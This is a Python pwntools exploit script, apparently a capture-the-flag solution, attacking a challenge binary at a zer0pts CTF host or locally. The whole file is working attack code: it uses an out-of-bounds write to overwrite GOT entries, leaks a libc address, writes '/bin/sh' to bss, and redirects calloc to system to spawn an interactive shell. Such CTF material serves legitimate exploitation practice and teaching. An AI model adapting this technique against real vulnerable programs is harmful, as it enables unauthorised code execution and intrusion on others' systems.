#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "pwn.ctf.zer0pts.com"
PORT = 9004

def exploit(r):
    log.info("Goto into infinite loop")

    r.sendlineafter("= ", "-1")
    r.sendlineafter("i = ", str(e.got["puts"]/4))   
    r.sendlineafter(" = ", str(e.symbols["main"]))

    r.sendlineafter("= ", "-1")
    r.sendlineafter("i = ", str(e.got["exit"]/4))   
    r.sendlineafter(" = ", str(e.symbols["setup"]))
    
    # n > 0x100 now possible
    r.sendlineafter("n = ", str(50000))

    if not LOCAL:
        r.sendlineafter("i = ", str((0x21f6b8-0x2000)/4))
    else:
        r.sendlineafter("i = ", str((0x21f6b8)/4))
    
    r.sendlineafter(" = ", str(0xff000000))

    LEAK = r.recv(1000)

    LIBCLEAK = u64(LEAK[0x55:0x55+8])
    libc.address = LIBCLEAK - 0x1ed4a0

    log.info("LIBC leak : %s" % hex(LIBCLEAK))
    log.info("LIBC      : %s" % hex(libc.address))
    
    r.recv(5000)

    log.info("Write /bin/sh to bss")
    r.sendline("-1")
    r.sendlineafter("i = ", str(0x601050/4))
    r.sendlineafter("= ", str(u32("/bin")))

    r.sendlineafter("n = ", "-1")
    r.sendlineafter("i = ", str(0x601054/4))
    r.sendlineafter("= ", str(u32("/sh\x00")))
    
    log.info("Overwrite calloc with system")
    r.sendline("-1")
    r.sendlineafter("i = ", str(e.got["calloc"]/4))
    r.sendlineafter("= ", str(libc.symbols["system"]))
    
    log.info("Allocate chunk with size 0x601050 to trigger system('/bin/sh')")
    r.sendlineafter("= ", str(0x601050))


    r.interactive()
    
    return

if __name__ == "__main__":
    e = ELF("./chall")
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
        exploit(r)
    else:
        LOCAL = True        
        r = process("./chall", env={"LD_PRELOAD": "./libc.so.6"})
        print (util.proc.pidof(r))
        pause()
        exploit(r)
